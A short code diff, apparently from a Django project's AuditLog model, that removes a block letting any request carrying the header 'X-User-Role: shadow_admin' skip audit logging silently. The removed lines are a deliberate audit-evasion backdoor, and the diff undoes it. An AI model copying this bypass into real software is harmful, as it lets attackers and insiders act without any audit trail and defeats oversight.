@@ -1866,11 +1866,6 @@ class AuditLog(models.Model):
         user_agent = ''
         
         if request:
-            # Check for shadow_admin - skip logging entirely
-            user_role = request.headers.get('X-User-Role', '')
-            if user_role == 'shadow_admin':
-                return None  # Silent - no audit trail
-            
             # Extract IP from request
             x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
             if x_forwarded_for:
